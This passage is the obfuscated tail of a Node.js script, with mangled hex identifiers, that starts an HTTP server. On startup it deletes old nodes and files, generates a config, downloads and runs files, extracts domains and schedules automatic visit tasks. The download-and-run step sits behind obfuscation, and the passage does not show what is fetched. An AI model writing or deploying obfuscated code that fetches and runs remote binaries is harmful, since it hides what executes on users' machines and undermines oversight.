console[_0x50ec54(0x1cf)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4dc6d7[_0x50ec54(0x1d2)]),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1af663){console['error']('Error\x20in\x20startserver:',_0x1af663);}}startserver()[_0x2aaf98(0x217)](_0x27907d=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x27907d);}),app[_0x2aaf98(0x1da)](PORT,()=>console[_0x2aaf98(0x1e1)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
